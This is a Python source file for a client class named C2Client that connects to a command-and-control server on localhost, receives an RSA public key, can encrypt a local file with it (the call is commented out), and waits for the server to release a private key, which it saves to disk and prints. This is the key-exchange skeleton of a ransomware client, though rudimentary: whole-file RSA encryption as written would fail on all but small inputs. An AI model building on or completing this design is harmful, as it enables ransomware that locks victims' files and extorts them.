import socket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

class C2Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect_to_server(self):
        self.client_socket.connect((self.host, self.port))
        print(f"Connected to server at {self.host}:{self.port}")

    def receive_public_key(self):
        # Receive the public key from the server
        public_key_pem = self.client_socket.recv(4096)  # Adjust size as needed
        public_key = serialization.load_pem_public_key(
            public_key_pem,
            backend=default_backend()
        )

        # Serialize the public key to PEM format for printing
        public_key_pem_printable = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        # Decode the PEM bytes to a string and print
        print(public_key_pem_printable.decode('utf-8'))

        return public_key # this is still a cryptolib obj

    def encrypt_file(self, public_key, file_path):
        # Encrypt the file using the public key
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        ciphertext = public_key.encrypt(
            plaintext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return ciphertext

    def wait_for_private_key(self):
        print("Waiting for private key from the server...")
        while True:
            data = self.client_socket.recv(4096)  # Adjust buffer size as needed
            if data:
                print("Received data from server.")
                # Assuming the data is the private key; handle accordingly
                try:
                    private_key = serialization.load_pem_private_key(
                        data,
                        password=None,
                        backend=default_backend()
                    )
                    print("Private key received from server.")

                    # Save the private key to a file
                    private_key_file_path = 'received_private_key.pem'
                    with open(private_key_file_path, 'wb') as key_file:
                        key_file.write(data)  # Write the PEM-encoded private key data
    
                    # Read the saved private key file and print its contents
                    with open(private_key_file_path, 'r') as key_file:
                        print(key_file.read())
    
                    return private_key  # Optionally return the private key object

                except ValueError as e:
                    print("Received data is not a valid private key:", e)
                break  # Exit loop and close connection after receiving the key

        self.client_socket.close()
        print("Connection closed.")

    def run(self):
        self.connect_to_server()
        public_key = self.receive_public_key()

        # Optionally encrypt a file with the public key
        # file_path = 'path/to/your/file'  # Specify the path to your file
        # encrypted_data = self.encrypt_file(public_key, file_path)

        private_key = self.wait_for_private_key()

if __name__ == '__main__':
    c2_client = C2Client("localhost", 8888)
    c2_client.run()
